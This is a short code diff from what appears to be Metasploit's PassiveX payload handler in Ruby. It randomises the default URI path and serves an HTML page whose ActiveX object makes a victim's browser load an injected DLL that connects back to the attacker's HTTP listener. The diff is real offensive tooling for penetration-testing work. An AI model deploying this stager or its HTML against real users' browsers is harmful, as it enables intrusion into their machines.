@@ -179,7 +179,7 @@ module PassiveX
 			[
 				OptAddress.new('PXHOST', [ true, "The local HTTP listener hostname" ]),
 				OptPort.new('PXPORT', [ true, "The local HTTP listener port", 8080 ]),
-				OptString.new('PXURI', [ true, "The URI root for requests", "/" ]),
+				OptString.new('PXURI', [ false, "The URI root for requests", "/" + Rex::Text.rand_text_alphanumeric(32) ]),
 				OptPath.new('PXAXDLL', [ true, "ActiveX DLL to inject", File.join(Msf::Config.install_root, "data", "passivex", "passivex.dll") ]),
 				OptString.new('PXAXCLSID', [ true, "ActiveX CLSID", "B3AC7307-FEAE-4e43-B2D6-161E68ABA838" ]),
 				OptString.new('PXAXVER', [ true, "ActiveX DLL Version", "-1,-1,-1,-1" ]),
@@ -313,7 +313,7 @@ protected
 				resp['Content-Type'] = 'text/html'
 				resp.body = 
 					"<html>" +
-					"	<object classid=\"CLSID:#{datastore['PXAXCLSID']}\" codebase=\"passivex.dll##{datastore['PXAXVER']}\">" +
+					"	<object classid=\"CLSID:#{datastore['PXAXCLSID']}\" codebase=\"#{datastore['PXURI'] + "/"}passivex.dll##{datastore['PXAXVER']}\">" +
 					"		<param name=\"HttpHost\" value=\"#{datastore['PXHOST']}\">" +		
 					"		<param name=\"HttpPort\" value=\"#{datastore['PXPORT']}\">" +
 					"		<param name=\"HttpUriBase\" value=\"#{datastore['PXURI']}\">" +
